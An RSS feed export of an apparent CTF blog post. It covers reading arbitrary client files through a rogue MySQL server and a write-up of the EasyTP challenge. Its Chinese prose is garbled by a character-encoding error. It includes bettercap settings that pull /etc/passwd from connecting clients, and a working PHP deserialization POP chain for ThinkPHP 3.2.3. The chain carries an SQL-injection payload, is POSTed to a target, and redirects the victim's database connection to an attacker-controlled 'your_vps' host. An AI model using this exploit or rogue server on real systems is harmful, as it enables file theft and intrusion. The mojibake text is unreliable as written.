<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>èœœç½ on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/%E8%9C%9C%E7%BD%90/</link><description>Recent content in èœœç½ on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 19 Dec 2021 20:22:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/%E8%9C%9C%E7%BD%90/index.xml" rel="self" type="application/rss+xml"/><item><title>MySQLä¼ªæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶</title><link>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</link><pubDate>Sun, 19 Dec 2021 20:22:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</guid><description>&lt;p>åº”è¯¥æ˜¯å„ä½å¸¦å¸ˆå‚…ä»¬æ—©å°±ä¼šçš„ç‚¹äº†ï¼Œåšé¢˜ç¢°åˆ°äº†æ‹¿å‡ºæ¥ç‚’ä¸ªå†·é¥­QwQï¼›å‚è€ƒé“¾æ¥ç»Ÿä¸€æ”¾åˆ°æœ€åé¢å•¦&lt;/p>
&lt;h2 id="åŸç†å¤ç°">åŸç†&amp;amp;å¤ç°&lt;/h2>
&lt;p>æ€»ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼šä¼ªé€ ä¸€ä¸ªmysqlçš„æœåŠ¡ç«¯ï¼ˆä¸éœ€è¦æœ‰å®Œæ•´çš„æ•°æ®åº“çš„åŠŸèƒ½ åªéœ€å‘å®¢æˆ·ç«¯å›å¤greeting packageï¼‰å½“æœ‰å®¢æˆ·ç«¯è¿æ¥åˆ°æ—¶ï¼Œå¯ä»¥è¢«æœåŠ¡ç«¯è®¿é—®ä¸€ä¸ªå®¢æˆ·ç«¯æœ¬åœ°çš„æ–‡ä»¶ï¼ˆå¦‚æœæœ¬åœ°ç”¨æˆ·æƒé™å…è®¸çš„è¯&lt;/p>
&lt;p>å¸®åŠ©æˆ‘ä»¬å®ç°è¿™ä¸€ç›®æ ‡çš„sqlè¯­å¥æ˜¯&lt;code>LOAD DATA INFILE&lt;/code>ï¼Œå®ƒç”¨äºè¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ”¾å…¥è¡¨ä¸­ï¼Œæœ‰ä¸¤ç§å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#111">local&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e"># æœ‰æ—¶ä¸FIELDS TERMINATED BY &amp;#39;\n&amp;#39;ä¸€èµ·ä½¿ç”¨
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»¥ä¸Šä¸¤ç§å†™æ³•çš„å·®å¼‚åœ¨äºæ˜¯å¦æœ‰&lt;code>local&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦è¯»å–clientæœ¬åœ°çš„æ–‡ä»¶&lt;/p>
&lt;p>&lt;img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/lightless/2bsdse1b1cf6g999bhhcyz9y/image.png" alt="æ¥è‡ªå®˜æ–¹æ–‡æ¡£">&lt;/p>
&lt;p>åœ¨æœ¬åœ°ç”¨wiresharkæŠ“ä¸ªåŒ…åº·åº·è¿™ä¸€sqlè¯­å¥å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113235801.png" alt="image-20210702113235801">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113241427.png" alt="image-20210702113241427">&lt;/p>
&lt;p>ï¼ˆè‚¥è‚ æ„ä¹‰ä¸æ˜çš„æˆªå›¾ï¼ˆäº”ä¸ªæœˆè¿‡å»äº† èƒ½è®°å¾—æ‰æœ‰é¬¼&lt;/p>
&lt;p>æ•´ä¸ªè¿‡ç¨‹ç®€åŒ–ä¸ºä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µ&lt;/p>
&lt;ul>
&lt;li>Client: Request Query: LOAD DATA LOCAL INFIEL &amp;lsquo;/etc/passwd&amp;rsquo; INTO TABLE test FIELDS TERMINATED BY &amp;lsquo;\n&amp;rsquo;&lt;/li>
&lt;li>Server: Response TABULAR: /etc/passwd&lt;/li>
&lt;li>Client: Request[Malformed Packet]: content of /etc/passwd&lt;/li>
&lt;/ul>
&lt;p>å¦‚æœåœ¨å®¢æˆ·ç«¯å‘é€æŸ¥è¯¢å è¿”å›ä¸€ä¸ª&lt;code>Response TABULAR&lt;/code>åŒ… å¹¶æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶ å°±å¯ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶äº†ï¼ˆå‰æä»ç„¶æ˜¯have read accessï¼‰&lt;/p>
&lt;p>ç”šè‡³ä¸ä¸€å®šéœ€è¦å®¢æˆ·ç«¯é¦–å…ˆå‘èµ· &lt;code>LOAD DATA LOCAL&lt;/code>çš„è¯·æ±‚æ‰èƒ½responseï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ç¬¬ä¸‰æ®µçš„æœ€åçš„æ‹¬å·ä¸­æç¤ºï¼Œä¼ªé€ çš„å®¢æˆ·ç«¯å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å›å¤ä¸€ä¸ª&lt;code>file-transfer&lt;/code>çš„è¯·æ±‚ï¼ˆä½†åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å‰ å®¢æˆ·ç«¯å¿…é¡»å…·æœ‰&lt;code>CLIENT_LOCAL_FILES&lt;/code>å±æ€§ ï¼ˆå¯ä»¥åœ¨è¿æ¥mysqlæ—¶æ·»åŠ  &lt;code>--enable-local-infile&lt;/code> æˆ–è®¾ç½®&lt;code>local_infile=ON&lt;/code>&lt;/p>
&lt;p>æ‰€ä»¥ä¸€æ—¦æœ‰ä¸€å°æ¶æ„çš„mysqlæœåŠ¡å™¨ å‘å‡ºå®Œå…¨ç›¸åŒçš„æ•°æ®åŒ…å»æ¨¡æ‹Ÿåˆå§‹çš„greetingæ¡æ‰‹è¿‡ç¨‹ï¼Œä¹‹åç­‰å¾…ä¸€ä¸ªå®¢æˆ·ç«¯çš„å“åº”ï¼ˆå¹¸è¿çš„æ˜¯å¤§å¤šæ•°MySQLå®¢æˆ·ç«¯ä»¥åŠç¨‹åºåº“éƒ½ä¼šåœ¨æ¡æ‰‹ä¹‹åè‡³å°‘å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œä»¥æ¢æµ‹ç›®æ ‡å¹³å°çš„æŒ‡çº¹ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼ˆ&lt;code>select @@version_comment limit 1&lt;/code>ï¼‰ï¼Œå†ä¹‹åå°±å¯ä»¥ä¼ªé€ &lt;code>load data local infile&lt;/code>æŒ‡ä»¤æ¥è·å–æ–‡ä»¶äº†&lt;/p>
&lt;p>æˆ‘ä»¬æ„é€ ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹å±æ€§çš„mysqlä¼ªæœåŠ¡ç«¯ï¼š&lt;/p>
&lt;ul>
&lt;li>å‘é€Server Greeting&lt;/li>
&lt;li>ç­‰å¾…client: Request Query package&lt;/li>
&lt;li>å›å¤è¯·æ±‚Response file-transfer&lt;/li>
&lt;/ul>
&lt;p>éœ€è¦å‘çš„åŒ…æ ¼å¼éƒ½åœ¨å®˜æ–¹æ–‡æ¡£ä¸Šå¯ä»¥æ‰¾åˆ°ï¼š&lt;a href="https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request">Protocol::LOCAL_INFILE_Request&lt;/a> &lt;a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake">Protocol::Handshake&lt;/a>&lt;/p>
&lt;p>å‡ ä¸ªå·²ç»é›†æˆè¿‡çš„ä¼ªé€ server: &lt;a href="https://github.com/bettercap/bettercap">bettercap&lt;/a> &lt;a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-MySql-Server&lt;/a>&lt;/p>
&lt;p>å¯ä»¥ç”¨bettercapè¿›è¡Œå®Œç¾å®è·µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702175622262.png" alt="image-20210702175622262">&lt;/p>
&lt;p>éœ€è¦è®¾ç½®çš„é¡¹éå¸¸ç®€å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#111">set&lt;/span> mysql.server.address 0.0.0.0 &lt;span style="color:#75715e"># å¦‚æœæƒ³ç”¨npsä¹‹ç±»çš„ä»£ç†å·¥å…·æ˜ å°„åˆ°å…¬ç½‘ç«¯å£è¯·åŠ¡å¿…è®¾ç½®æ­¤é¡¹&lt;/span>
&lt;span style="color:#111">set&lt;/span> mysql.server.infile /etc/passwd &lt;span style="color:#75715e"># æƒ³è¦è¯»å–çš„æ–‡ä»¶&lt;/span>
&lt;span style="color:#111">set&lt;/span> mysql.server.outfile /xxxx &lt;span style="color:#75715e"># ä¿å­˜åˆ°æœ¬åœ°çš„ä½ç½®&lt;/span>
&lt;span style="color:#111">set&lt;/span> mysql.server.port 1099 &lt;span style="color:#75715e"># éšæ„ç«¯å£éƒ½å¯ä»¥&lt;/span>
mysql.server on
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="çº¢æ˜è°·ctf-2021easytp">[çº¢æ˜è°·CTF 2021]EasyTP&lt;/h2>
&lt;p>tp3.2.3ï¼Œæœ‰ä¸€ä¸ªç°æˆçš„é“¾å­ï¼š&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
&lt;p>çœ‹Application\Home\Controller\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾&lt;code>__destruct()&lt;/code>å‡½æ•°&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png" alt="image-20211219163343446">&lt;/p>
&lt;p>å¯»æ‰¾ä¸€ä¸ª&lt;code>destroy()&lt;/code>&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png" alt="image-20211219163445086">&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦ä¸€ä¸ª&lt;code>$sessID&lt;/code>ï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ&lt;code>$this-&amp;gt;sessionName&lt;/code>å¯æ§ï¼›æ¥ç€æ‰¾å«æœ‰&lt;code>delete()&lt;/code>çš„ç±»&lt;/p>
&lt;p>www/ThinkPHP/Mode/Lite/Model.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png" alt="image-20211219163653936">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png" alt="image-20211219163713363">&lt;/p>
&lt;p>ç›¸å½“äºä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„&lt;code>delete()&lt;/code>æ–¹æ³•äº†&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Db/Driver.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png" alt="image-20211219170053771">&lt;/p>
&lt;p>å®ƒæ˜¯æ‹¼æ¥äº†$sqlè¯­å¥ï¼Œä¹‹åæ‰§è¡Œ&lt;code>$this-&amp;gt;execute()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png" alt="image-20211219171035987">&lt;/p>
&lt;p>å®ƒä¼šé¢„å…ˆè¿›è¡Œ&lt;code>$this-&amp;gt;initConnect()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png" alt="image-20211219171103370">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png" alt="image-20211219171123961">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶&lt;code>$config&lt;/code>ï¼Œæ§åˆ¶è¿æ¥ä»»æ„æ•°æ®åº“&lt;/p>
&lt;p>è¿™é‡Œå¯ä»¥ç»“åˆä¸Šé¢çš„mysqlä¼ªæœåŠ¡ç«¯ä»»æ„æ–‡ä»¶è¯»å–äº†ï¼Œæ¯”å¦‚ä»¥ä¸‹çš„åˆ©ç”¨æµç¨‹ï¼š&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢&lt;/li>
&lt;li>å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;li>å‡ºå‘ååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘PDOè¿æ¥éƒ¨åˆ†&lt;/li>
&lt;li>è·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;p>ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
